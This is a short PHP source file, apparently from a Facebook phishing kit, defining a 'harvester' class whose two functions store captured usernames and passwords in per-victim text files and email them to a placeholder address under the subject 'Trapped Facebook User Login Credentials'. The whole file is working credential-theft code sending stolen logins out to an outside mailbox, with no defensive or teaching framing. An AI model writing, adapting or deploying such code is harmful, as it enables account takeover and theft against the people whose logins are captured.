<?php
Class harvester {
	public $uname, $passwd;
	
	function harvest_toFile($uname, $passwd){
		$myfile = fopen('../harvests/'.$uname.'.txt', "w") or die("Unable to open file!");
		$txt = "Username: '".$uname."'\nPassword: '".$passwd."'\n";
		fwrite($myfile, $txt);
		fclose($myfile);
	}

	function harvest_toMail($uname, $passwd){
		$to = "user@domain.tld";
         	$subject = "Trapped Facebook User Login Credentials";
         
	        $message .= "<h1>The Login Credentials for user: '".$uname."' </h1>";
	        $message = "<b>Username:</b> '".$uname."'\n<b>Password:</b> '".$passwd."'\n";

         	$header = "From:no-reply@domain.tld \r\n";
         	$header .= "Cc:user@domain.tld \r\n";
         	$header .= "MIME-Version: 1.0\r\n";
         	$header .= "Content-type: text/html\r\n";
         
         	$retval = mail ($to,$subject,$message,$header);
         
         	/*if( $retval == true ) {
            		echo "Message sent successfully...";
         	}else {
            		echo "Message could not be sent...";
         	}*/
	}
};

